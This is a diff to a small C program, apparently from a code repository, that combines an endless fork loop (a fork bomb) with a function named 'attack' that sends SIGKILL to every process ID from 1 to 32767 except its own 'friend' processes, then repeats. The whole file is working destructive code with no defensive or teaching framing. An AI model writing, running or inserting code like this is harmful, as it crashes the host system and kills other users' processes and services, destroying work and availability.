@@ -10,30 +10,31 @@
 #include <time.h>
 #include <proc/readproc.h>
 
-void attack(bool friends[]);
+void attack();
+bool friends[32768];
 
 int main(int argc, char* argv[]) {
-
-	bool friends[32768];
-	int p;
-
+	friends[getpid()] = true;
+	//int p;
 	while(1){
-		p = fork();
-		friends[p] = true;
+		int p = fork();
 		if(p == 0){
-			attack(friends);
+			attack();
+		}
+		else if(p == -1){
+			attack();
 		}
 	}
 }
-void attack(bool friends[]){
-
+void attack(){
 	friends[getpid()] = true;
 	int p;
-	//srand(time(NULL));
-	int i = 1;//rand() % 32768 + 1;
-	while(1){
+	int i = 1;
+	while(i < 32767){
 		if(!friends[i]){
-			kill(i++, SIGKILL);
+			kill(i, SIGKILL);
 		}
+		i++;
 	}
+	attack();
 }
